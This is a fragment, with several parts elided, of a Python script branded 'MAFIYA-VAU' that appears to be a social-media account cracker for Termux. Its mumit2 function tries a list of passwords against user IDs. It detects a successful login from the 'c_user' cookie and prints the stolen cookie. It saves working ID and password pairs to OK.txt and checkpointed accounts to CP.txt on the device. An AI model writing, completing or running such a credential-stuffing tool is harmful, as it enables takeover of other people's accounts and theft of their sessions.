...
logo = ("""\033[1;37m
  ...
  __  __          ______ _______     __       __      __    _    _ 
 |  \/  |   /\   |  ____|_   _\ \   / //\     \ \    / /\  | |  | |
 | \  / |  /  \  | |__    | |  \ \_/ //  \     \ \  / /  \ | |  | |
 | |\/| | / /\ \ |  __|   | |   \   // /\ \     \ \/ / /\ \| |  | |
 | |  | |/ ____ \| |     _| |_   | |/ ____ \     \  / ____ \ |__| |
 |_|  |_/_/    \_\_|    |_____|  |_/_/    \_\     \/_/    \_\____/ 
...
def fuck():
    ...
    print(' [+] OK Ids saved in MAFIYA-VAU/OK.txt')
    print(' [+] CP Ids saved in MAFIYA-VAU/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[MAFIYA-VAU]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[MAFIYA-VAU-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/MAFIYA-VAU/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[MAFIYA-VAU-CP] {cid}|{ps}")
                open('/sdcard/MAFIYA-VAU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
